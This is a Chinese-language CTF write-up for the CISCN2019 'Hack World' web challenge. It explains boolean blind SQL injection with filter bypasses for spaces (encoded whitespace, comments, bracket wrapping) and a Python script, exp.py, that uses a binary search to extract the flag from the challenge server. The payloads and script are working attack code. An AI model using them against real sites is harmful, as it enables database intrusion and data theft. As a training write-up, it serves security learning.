# [CISCN2019 华北赛区 Day2 Web1]Hack World

## 知识点

`sql注入`

`bool盲注`

`二分法`

## 解题

根据1和2返回结果的不同，可能是bool盲注，`()`没有过滤，可以使用大部分函数，当时是卡在了空格的绕过
空格的绕过有这些方法我测试是可以的
`%09` `%0a` `%0b` `%0c` `%0d` `/**/` `/*!*/`或者直接tab
`%20` 好像没法绕，`%00`截断好像也影响sql语句的执行
或者用括号也可以。任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。
本题中可以`if(ascii(substr((select(flag)from(flag)),1,1))=ascii('f'),1,2)`

```
id=0^(ascii(substr((select(flag)from(flag)),1,1))>101)
```

`exp.py`

```python
import requests

url = 'http://5cc23316-a978-42e6-ac81-c850336c7bfc.node4.buuoj.cn:81/index.php'
result = ''

for x in range(1, 50):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high > low:
        payload = "if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)" % (x, mid)
        data = {
            "id":payload
        }
        response = requests.post(url, data = data)
        response.encoding = response.apparent_encoding
        if 'Hello' in response.text:  # 正常回显特征
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

    result += chr(int(mid))
    print(result)
```

[参考文章1](https://www.cnblogs.com/20175211lyz/p/11435298.html)

[参考文章2](https://www.cnblogs.com/zzjdbk/p/13650826.html)